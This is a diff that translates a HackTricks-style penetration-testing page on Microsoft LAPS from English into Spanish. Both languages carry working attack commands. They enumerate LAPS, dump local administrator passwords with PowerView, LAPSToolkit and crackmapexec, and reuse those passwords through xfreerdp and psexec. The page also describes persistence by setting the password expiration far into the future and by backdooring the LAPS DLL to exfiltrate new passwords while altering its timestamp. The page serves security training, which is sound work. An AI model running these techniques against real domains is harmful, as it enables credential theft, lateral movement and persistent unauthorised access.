@@ -6,14 +6,13 @@
 
 {% embed url="https://websec.nl/" %}
 
-## Basic Information
+## Información Básica
 
-Local Administrator Password Solution (LAPS) is a tool used for managing a system where **administrator passwords**, which are **unique, randomized, and frequently changed**, are applied to domain-joined computers. These passwords are stored securely within Active Directory and are only accessible to users who have been granted permission through Access Control Lists (ACLs). The security of the password transmissions from the client to the server is ensured by the use of **Kerberos version 5** and **Advanced Encryption Standard (AES)**.
+Local Administrator Password Solution (LAPS) es una herramienta utilizada para gestionar un sistema donde **las contraseñas de administrador**, que son **únicas, aleatorias y cambiadas con frecuencia**, se aplican a computadoras unidas al dominio. Estas contraseñas se almacenan de forma segura dentro de Active Directory y solo son accesibles para los usuarios que han recibido permiso a través de Listas de Control de Acceso (ACLs). La seguridad de las transmisiones de contraseñas desde el cliente al servidor se asegura mediante el uso de **Kerberos versión 5** y **Advanced Encryption Standard (AES)**.
 
-In the domain's computer objects, the implementation of LAPS results in the addition of two new attributes: **`ms-mcs-AdmPwd`** and **`ms-mcs-AdmPwdExpirationTime`**. These attributes store the **plain-text administrator password** and **its expiration time**, respectively.
+En los objetos de computadora del dominio, la implementación de LAPS resulta en la adición de dos nuevos atributos: **`ms-mcs-AdmPwd`** y **`ms-mcs-AdmPwdExpirationTime`**. Estos atributos almacenan la **contraseña de administrador en texto claro** y **su tiempo de expiración**, respectivamente.
 
-### Check if activated
-
+### Verificar si está activado
 ```bash
 reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
 
@@ -26,13 +25,11 @@ Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, 
 # Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
 Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
 ```
+### Acceso a la Contraseña LAPS
 
-### LAPS Password Access
+Puedes **descargar la política LAPS en bruto** desde `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` y luego usar **`Parse-PolFile`** del paquete [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) para convertir este archivo en un formato legible por humanos.
 
-You could **download the raw LAPS policy** from `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` and then use **`Parse-PolFile`** from the [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.
-
-Moreover, the **native LAPS PowerShell cmdlets** can be used if they're installed on a machine we have access to:
-
+Además, se pueden usar los **cmdlets nativos de PowerShell de LAPS** si están instalados en una máquina a la que tenemos acceso:
 ```powershell
 Get-Command *AdmPwd*
 
@@ -53,9 +50,7 @@ Find-AdmPwdExtendedRights -Identity Workstations | fl
 # Read the password
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 ```
-
-**PowerView** can also be used to find out **who can read the password and read it**:
-
+**PowerView** también se puede utilizar para averiguar **quién puede leer la contraseña y leerla**:
 ```powershell
 # Find the principals that have ReadPropery on ms-Mcs-AdmPwd
 Get-AdmPwdPassword -ComputerName wkstn-2 | fl
@@ -63,13 +58,11 @@ Get-AdmPwdPassword -ComputerName wkstn-2 | fl
 # Read the password
 Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
 ```
-
 ### LAPSToolkit
 
-The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilitates the enumeration of LAPS this with several functions.\
-One is parsing **`ExtendedRights`** for **all computers with LAPS enabled.** This will show **groups** specifically **delegated to read LAPS passwords**, which are often users in protected groups.\
-An **account** that has **joined a computer** to a domain receives `All Extended Rights` over that host, and this right gives the **account** the ability to **read passwords**. Enumeration may show a user account that can read the LAPS password on a host. This can help us **target specific AD users** who can read LAPS passwords.
-
+El [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita la enumeración de LAPS con varias funciones.\
+Una es analizar **`ExtendedRights`** para **todas las computadoras con LAPS habilitado.** Esto mostrará **grupos** específicamente **delegados para leer las contraseñas de LAPS**, que a menudo son usuarios en grupos protegidos.\
+Una **cuenta** que ha **unido una computadora** a un dominio recibe `All Extended Rights` sobre ese host, y este derecho le da a la **cuenta** la capacidad de **leer contraseñas**. La enumeración puede mostrar una cuenta de usuario que puede leer la contraseña de LAPS en un host. Esto puede ayudarnos a **dirigirnos a usuarios específicos de AD** que pueden leer las contraseñas de LAPS.
 ```powershell
 # Get groups that can read passwords
 Find-LAPSDelegatedGroups
@@ -93,19 +86,15 @@ ComputerName                Password       Expiration
 ------------                --------       ----------
 DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
 ```
+## **Extracción de Contraseñas LAPS Con Crackmapexec**
 
-## **Dumping LAPS Passwords With Crackmapexec**
-
-If there is no access to a powershell you can abuse this privilege remotely through LDAP by using
-
+Si no hay acceso a un powershell, puedes abusar de este privilegio de forma remota a través de LDAP utilizando
 ```
 crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
 ```
+Esto volcará todas las contraseñas que el usuario puede leer, lo que te permitirá obtener una mejor posición con un usuario diferente.
 
-This will dump all the passwords that the user can read, allowing you to get a better foothold with a different user.
-
-## ** Using LAPS Password **
-
+## ** Usando la contraseña de LAPS **
 ```
 xfreerdp /v:192.168.1.1:3389  /u:Administrator
 Password: 2Z@Ae)7!{9#Cq
@@ -113,13 +102,11 @@ Password: 2Z@Ae)7!{9#Cq
 python psexec.py Administrator@web.example.com
 Password: 2Z@Ae)7!{9#Cq
 ```
+## **Persistencia de LAPS**
 
-## **LAPS Persistence**
+### **Fecha de Expiración**
 
-### **Expiration Date**
-
-Once admin, it's possible to **obtain the passwords** and **prevent** a machine from **updating** its **password** by **setting the expiration date into the future**.
-
+Una vez que se tiene acceso de administrador, es posible **obtener las contraseñas** y **prevenir** que una máquina **actualice** su **contraseña** **estableciendo la fecha de expiración en el futuro**.
 ```powershell
 # Get expiration time
 Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
@@ -128,17 +115,16 @@ Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime
 ## It's needed SYSTEM on the computer
 Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
 ```
-
 > [!WARNING]
-> The password will still reset if an **admin** uses the **`Reset-AdmPwdPassword`** cmdlet; or if **Do not allow password expiration time longer than required by policy** is enabled in the LAPS GPO.
+> La contraseña aún se restablecerá si un **admin** utiliza el **`Reset-AdmPwdPassword`** cmdlet; o si **No permitir que el tiempo de expiración de la contraseña sea más largo de lo requerido por la política** está habilitado en el GPO de LAPS.
 
 ### Backdoor
 
-The original source code for LAPS can be found [here](https://github.com/GreyCorbel/admpwd), therefore it's possible to put a backdoor in the code (inside the `Get-AdmPwdPassword` method in `Main/AdmPwd.PS/Main.cs` for example) that will somehow **exfiltrate new passwords or store them somewhere**.
+El código fuente original de LAPS se puede encontrar [aquí](https://github.com/GreyCorbel/admpwd), por lo tanto, es posible poner una puerta trasera en el código (dentro del método `Get-AdmPwdPassword` en `Main/AdmPwd.PS/Main.cs`, por ejemplo) que de alguna manera **exfiltre nuevas contraseñas o las almacene en algún lugar**.
 
-Then, just compile the new `AdmPwd.PS.dll` and upload it to the machine in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (and change the modification time).
+Luego, solo compila el nuevo `AdmPwd.PS.dll` y súbelo a la máquina en `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (y cambia la hora de modificación).
 
-## References
+## Referencias
 
 - [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
 
@@ -147,4 +133,3 @@ Then, just compile the new `AdmPwd.PS.dll` and upload it to the machine in `C:\T
 {% embed url="https://websec.nl/" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
